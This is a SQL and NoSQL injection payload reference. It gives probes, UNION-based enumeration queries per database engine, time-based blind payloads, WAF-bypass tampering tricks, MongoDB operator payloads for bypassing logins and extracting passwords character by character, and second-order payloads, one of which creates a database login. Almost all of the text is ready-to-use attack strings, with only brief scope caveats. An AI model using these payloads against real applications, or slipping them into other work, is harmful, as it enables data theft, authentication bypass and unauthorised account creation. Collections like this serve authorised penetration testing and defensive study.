# SQLi Payload Reference

## Detection probes

```text
'
''
`
``
,
"
""
/ \
' OR '1
' OR 1 -- -
" OR "" = "
' OR '1'='1'--
') OR ('1'='1--
1'1
1 WAITFOR DELAY '0:0:5'--
%' AND 8334=8334 AND '%'='
```

## Union column discovery

```sql
' ORDER BY 1-- -          ... increment N until error
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION ALL SELECT NULL,NULL,NULL-- -
```

## DBMS enumeration one-liners

```sql
MySQL:      ' UNION SELECT @@version,user(),database()-- -
PostgreSQL: ' UNION SELECT version(),current_user,current_database()-- -
MSSQL:      ' UNION SELECT @@version,SYSTEM_USER,DB_NAME()-- -
Oracle:     ' UNION SELECT banner,NULL FROM v$version-- -
SQLite:     ' UNION SELECT sqlite_version(),sql,name FROM sqlite_master-- -
```

## Time-based per DBMS

```sql
MySQL:      ' AND SLEEP(5)-- -        / BENCHMARK(5000000,MD5('x'))
PostgreSQL: ' || pg_sleep(5)-- -      / pg_sleep_for(interval '5 seconds')
MSSQL:      '; WAITFOR DELAY '0:0:5'-- -
Oracle:     ' AND 1=(SELECT COUNT(*) FROM all_objects a,all_objects b WHERE a.rownum<=3000000)-- -
SQLite:     randomblob(500000000) in a subquery (heavy, use sparingly)
```

## WAF bypass tamper ideas (apply only after block confirmed)

```text
space2comment    '/**/' replaces spaces
between          BETWEEN operator instead of >
randomcase       RaNdOmCaSe keywords
charencode       URL-encode once; chardoubleencode twice
equaltolike      LIKE instead of =
percentage       %k prefix per char (IIS)
```

## NoSQL (MongoDB) operators

```json
{"user":{"$ne":""},"pass":{"$ne":""}}
{"user":{"$regex":"^admin"},"pass":{"$ne":""}}
{"user":{"$in":["admin","root"]},"pass":{"$gt":""}}
{"$where":"this.username=='admin'"}
{"$where":"Object.keys(this)[0].length==5"}
```

Regex extraction loop (one char at a time):
```json
{"user":"admin","pass":{"$regex":"^p"}}
{"user":"admin","pass":{"$regex":"^pa"}}
...
```

## Second-order storage payloads

```text
x'||(SELECT ''||version())||'
x'+(SELECT user())+'
x'; EXEC sp_addlogin 'u','p'-- -   (only where scope explicitly permits)
```

Never store destructive payloads on production accounts you do not own.
